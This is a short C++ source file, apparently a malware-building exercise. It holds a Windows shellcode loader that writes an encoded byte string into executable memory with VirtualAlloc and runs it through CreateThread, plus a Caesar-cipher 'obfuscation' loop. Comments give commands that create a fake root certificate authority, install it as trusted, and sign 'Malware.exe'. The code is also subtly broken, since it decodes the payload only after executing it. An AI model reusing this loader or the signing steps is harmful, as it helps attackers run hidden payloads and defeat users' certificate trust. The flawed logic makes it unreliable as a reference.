#ifdef USE_KERNEL32
#include <Windows.h>
#endif
#include <bits/stdc++.h>


using namespace std;
int main()
{
    #ifdef USE_KERNEL32 
    //this condition removes dependecy on the library (kernel32.lib) that can be called a malicious activity
    
    const char shellcode[] = "\x79\x80\x73\x83\x72\x7c\x7d\x7b\x2d\x3b\x7d\x2d\x84\x76\x7e\x71\x7d\x77 \x82\x3c\x82\x75\x72\x7a\x7a\x6c\x6f\x76\x7c\x73\x6c\x81\x70\x7d\x2d\x59\x5d\x5c\x5f\x61\x4b\x41\x41\x41\x41\x2d\x2d\x73\x2d\x70";
    PVOID shellcode_exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //this allocates a virtual memory onto the windows os stack so that we can place our shellcode there
    RtlCopyMemory(shellcode_exec, shellcode, sizeof(shellcode));
    //this places the shellcode at the location
    DWORD threadID;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
    //this creates a thread to eecute the shellcode
    WaitForSingleObject(hThread, INFINITE);
    //this makes sure that the shellcode finishes executing 

//OBFUSCATION TECHNIQUES
    for (int i = 0; i < sizeof shellcode; i++)
	{
		((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) - 13;   //simply applying caesar cipher to generate the right code
        // std::cout<<(shellcode_exec);
	}
    #endif

//CREATING FAKE CERTIFICATES
    //makecert -r -pe -n "CN=Malwr CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MalwrCA.pvk MalwrCA.cer
    //certutil -user -addstore Root MalwrCA.cer
    //makecert -pe -n "CN=Malwr Cert" -a sha256 -cy end -sky signature -ic MalwrCA.cer -iv MalwrCA.pvk -sv MalwrCert.pvk MalwrCert.cer
    //pvk2pfx -pvk MalwrCert.pvk -spc MalwrCert.cer -pfx MalwrCert.pfx
    //signtool sign /v /f MalwrCert.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll Malware.exe




    return 0;
}
